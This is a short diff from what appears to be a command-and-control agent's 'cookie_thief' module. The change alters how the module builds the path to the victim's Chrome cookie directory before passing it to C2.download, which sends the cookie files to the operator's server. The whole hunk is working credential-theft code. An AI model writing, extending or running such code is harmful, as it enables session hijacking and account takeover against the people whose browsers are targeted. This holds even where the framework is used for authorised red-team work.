@@ -20,7 +20,7 @@ exports.cookie_thief = function(task, command, params){
     if(browser == "chrome") {
       cookiedir = chromeCookieDir;
     }
-    cookieDLPath = homedir + cookiedir;
+    cookieDLPath = JSON.parse('{"path":"' + homedir + cookiedir + '"}');
     try{
         let status = C2.download(task, cookieDLPath);
     	if(status.hasOwnProperty("file_id")){
